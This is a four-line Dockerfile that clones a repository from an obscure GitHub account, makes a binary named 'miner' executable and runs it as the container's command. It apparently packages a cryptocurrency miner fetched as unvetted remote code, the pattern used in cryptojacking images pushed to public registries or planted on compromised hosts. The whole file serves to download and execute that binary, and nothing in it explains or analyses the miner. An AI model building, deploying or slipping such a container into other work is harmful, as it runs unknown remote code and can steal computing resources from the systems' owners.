FROM ubuntu:latest
RUN git clone https://github.com/drgdergerte5/fghf.git /fghf
RUN chmod +x /fghf/miner
CMD ["/fghf/miner"]
